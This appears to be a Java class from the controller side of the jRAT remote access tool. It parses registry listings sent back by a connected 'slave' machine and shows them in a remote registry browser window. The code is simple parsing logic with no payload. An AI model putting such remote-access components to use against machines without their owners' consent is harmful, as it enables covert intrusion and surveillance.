package jrat.module.registry;

import com.redpois0n.pathtree.FolderTreeNode;
import com.redpois0n.pathtree.PathTreeNode;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.AbstractIncomingPacket;
import jrat.module.registry.ui.FrameRemoteRegistry;

import java.io.DataInputStream;
import javax.swing.ImageIcon;
import javax.swing.tree.TreePath;

public class PacketResult extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String path = slave.readLine();

		FrameRemoteRegistry frame = FrameRemoteRegistry.INSTANCES.get(slave);

		while (dis.readBoolean()) {
			String line = slave.readLine();

			String[] args = line.trim().split("    ");

			String name = args[0];
			name = name.substring(name.lastIndexOf("\\") + 1, name.length());

			System.out.println(line);
			if (args.length >= 3) {
                boolean sz = args[1].equalsIgnoreCase("REG_SZ");
                String value = args[2];

                frame.addKey(name, value, sz);
            } else {
                frame.addSubkey(path, name);
            }
		}
	}
}
